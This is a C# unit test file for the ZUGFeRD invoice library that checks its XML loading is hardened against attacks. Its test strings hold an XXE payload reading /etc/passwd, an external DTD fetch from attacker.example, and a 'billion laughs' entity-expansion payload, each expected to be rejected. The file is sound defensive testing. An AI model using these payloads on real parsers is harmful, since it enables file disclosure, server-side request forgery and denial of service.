/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
using System;
using System.IO;
using System.Text;
using System.Xml;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using s2industries.ZUGFeRD;

namespace s2industries.ZUGFeRD.Test
{
    /// <summary>
    /// Verifies that loading untrusted invoice XML is hardened against
    /// XML External Entity (XXE) attacks and entity-expansion denial of service
    /// ("billion laughs"). All reader Load() paths route through
    /// <c>XmlSecurityHelper.LoadSecureDocument</c>, which prohibits DTDs entirely.
    ///
    /// The marker element &gt;urn:cen.eu:en16931:2017&lt; makes the version
    /// auto-detection select the CII 2.x reader, so the hardened load path is exercised.
    /// </summary>
    [TestClass]
    public class XmlSecurityTests
    {
        private static MemoryStream ToStream(string xml)
        {
            return new MemoryStream(Encoding.UTF8.GetBytes(xml));
        }


        [TestMethod]
        public void Load_WithXxeExternalEntity_IsRejected()
        {
            // Classic XXE: tries to read a local file via an external entity.
            // A hardened parser must refuse the DTD outright instead of resolving the entity.
            string maliciousXml =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE root [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>" +
                "<root><id>urn:cen.eu:en16931:2017</id><data>&xxe;</data></root>";

            using (MemoryStream ms = ToStream(maliciousXml))
            {
                Assert.ThrowsException<XmlException>(() => InvoiceDescriptor.Load(ms));
            }
        } // !Load_WithXxeExternalEntity_IsRejected()


        [TestMethod]
        public void Load_WithExternalDtd_IsRejected()
        {
            // SSRF / external DTD fetch attempt.
            string maliciousXml =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<!DOCTYPE root SYSTEM \"http://attacker.example/evil.dtd\">" +
                "<root><id>urn:cen.eu:en16931:2017</id></root>";

            using (MemoryStream ms = ToStream(maliciousXml))
            {
                Assert.ThrowsException<XmlException>(() => InvoiceDescriptor.Load(ms));
            }
        } // !Load_WithExternalDtd_IsRejected()


        [TestMethod]
        public void Load_WithBillionLaughs_IsRejected()
        {
            // Entity-expansion DoS. Prohibiting the DTD blocks the entity declarations
            // before any expansion can happen.
            string maliciousXml =
                "<?xml version=\"1.0\"?>" +
                "<!DOCTYPE lolz [" +
                "  <!ENTITY lol \"lol\">" +
                "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">" +
                "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">" +
                "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">" +
                "]>" +
                "<lolz><id>urn:cen.eu:en16931:2017</id><data>&lol4;</data></lolz>";

            using (MemoryStream ms = ToStream(maliciousXml))
            {
                Assert.ThrowsException<XmlException>(() => InvoiceDescriptor.Load(ms));
            }
        } // !Load_WithBillionLaughs_IsRejected()


        [TestMethod]
        public void Load_LegitimateInvoice_StillWorks()
        {
            // A valid invoice contains no DTD and must continue to load unchanged.
            InvoiceDescriptor desc = new InvoiceProvider().CreateInvoice();

            using (MemoryStream ms = new MemoryStream())
            {
                desc.Save(ms, ZUGFeRDVersion.Version23, Profile.Extended);
                ms.Seek(0, SeekOrigin.Begin);

                InvoiceDescriptor loaded = InvoiceDescriptor.Load(ms);

                Assert.IsNotNull(loaded);
                Assert.AreEqual(desc.InvoiceNo, loaded.InvoiceNo);
            }
        } // !Load_LegitimateInvoice_StillWorks()
    }
}
